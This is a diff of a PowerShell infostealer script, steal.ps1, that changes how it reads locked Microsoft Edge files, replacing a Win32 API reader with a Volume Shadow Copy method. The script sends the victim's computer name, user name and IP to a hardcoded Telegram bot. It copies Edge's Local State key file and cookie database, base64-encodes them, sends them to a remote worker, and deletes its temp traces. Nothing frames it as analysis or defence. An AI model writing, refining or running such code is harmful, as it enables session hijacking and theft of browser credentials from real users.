@@ -1,5 +1,5 @@
 # steal.ps1
-# Uses Win32 API to read Edge files even when locked.
+# Uses Volume Shadow Copy to read locked Edge files.
 
 $t = "8940444810:AAHeKIwsLgAI2o7H20984vi_1K-yEI2J3k8"
 $c = "6760965981"
@@ -10,86 +10,58 @@ $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyConti
 $body = @{ chat_id = $c; text = "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip" }
 Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
 
-# --- Win32 API to read locked files ---
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-
-public class Win32File
-{
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr CreateFile(
-        string lpFileName,
-        uint dwDesiredAccess,
-        uint dwShareMode,
-        IntPtr lpSecurityAttributes,
-        uint dwCreationDisposition,
-        uint dwFlagsAndAttributes,
-        IntPtr hTemplateFile);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern bool ReadFile(
-        IntPtr hFile,
-        byte[] lpBuffer,
-        uint nNumberOfBytesToRead,
-        out uint lpNumberOfBytesRead,
-        IntPtr lpOverlapped);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern bool CloseHandle(IntPtr hObject);
-
-    public static byte[] ReadFileWithSharedAccess(string path)
-    {
-        const uint GENERIC_READ = 0x80000000;
-        const uint FILE_SHARE_READ = 0x00000001;
-        const uint FILE_SHARE_WRITE = 0x00000002;
-        const uint OPEN_EXISTING = 3;
-
-        IntPtr handle = CreateFile(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
-        if (handle.ToInt64() == -1)
-        {
-            return null;
+# --- Function to copy using Volume Shadow Copy ---
+function Copy-WithVSS {
+    param($src, $dst)
+    # Create a shadow copy of C:
+    $shadowOutput = vssadmin create shadow /for=C: 2>&1
+    if ($LASTEXITCODE -ne 0) { return $false }
+    # Extract Shadow ID
+    $match = [regex]::Match($shadowOutput, "Shadow Copy ID: \{(.*)\}")
+    if ($match.Success) {
+        $shadowId = $match.Groups[1].Value
+        $shadowDevice = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$shadowId\"
+        $srcShadow = $shadowDevice + ($src -replace '^C:\\', '')
+        try {
+            Copy-Item $srcShadow $dst -Force -ErrorAction Stop
+            $success = $true
+        } catch {
+            $success = $false
         }
-        try
-        {
-            long length = new System.IO.FileInfo(path).Length;
-            byte[] buffer = new byte[length];
-            uint bytesRead = 0;
-            if (ReadFile(handle, buffer, (uint)length, out bytesRead, IntPtr.Zero))
-            {
-                return buffer;
-            }
-            return null;
-        }
-        finally
-        {
-            CloseHandle(handle);
-        }
+        # Delete the shadow
+        vssadmin delete shadows /shadow=$shadowId /quiet | Out-Null
+        return $success
     }
+    return $false
 }
-"@
 
-# --- Read Local State ---
+$temp = "$env:TEMP\exfil"
+New-Item -ItemType Directory -Force -Path $temp | Out-Null
+
 $src_ls = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
-$bytes_ls = [Win32File]::ReadFileWithSharedAccess($src_ls)
-if (-not $bytes_ls) {
-    $body = @{ chat_id = $c; text = "ERROR: Could not read Local State" }
-    Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
-    exit
-}
-$b64_ls = [Convert]::ToBase64String($bytes_ls)
-
-# --- Read Cookies.db ---
+$dst_ls = "$temp\Edge_LocalState.json"
 $src_cookies = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
-$bytes_cookies = [Win32File]::ReadFileWithSharedAccess($src_cookies)
-if (-not $bytes_cookies) {
-    $body = @{ chat_id = $c; text = "ERROR: Could not read Cookies.db" }
+$dst_cookies = "$temp\Edge_Cookies.db"
+
+# Try normal copy, then VSS
+$ls_ok = Copy-Item $src_ls $dst_ls -Force -ErrorAction SilentlyContinue
+if (-not $ls_ok) { $ls_ok = Copy-WithVSS $src_ls $dst_ls }
+
+$cookies_ok = Copy-Item $src_cookies $dst_cookies -Force -ErrorAction SilentlyContinue
+if (-not $cookies_ok) { $cookies_ok = Copy-WithVSS $src_cookies $dst_cookies }
+
+if (-not $ls_ok -or -not $cookies_ok) {
+    $body = @{ chat_id = $c; text = "ERROR: Could not copy files" }
     Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
     exit
 }
+
+# Read and encode
+$bytes_ls = [System.IO.File]::ReadAllBytes($dst_ls)
+$b64_ls = [Convert]::ToBase64String($bytes_ls)
+$bytes_cookies = [System.IO.File]::ReadAllBytes($dst_cookies)
 $b64_cookies = [Convert]::ToBase64String($bytes_cookies)
 
-# --- Send to worker ---
 $payload = @{
     pc = $env:COMPUTERNAME
     user = $env:USERNAME
@@ -106,3 +78,5 @@ try {
     $body = @{ chat_id = $c; text = "ERROR sending to worker: $_" }
 }
 Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
+
+Remove-Item $temp -Recurse -Force -ErrorAction SilentlyContinue
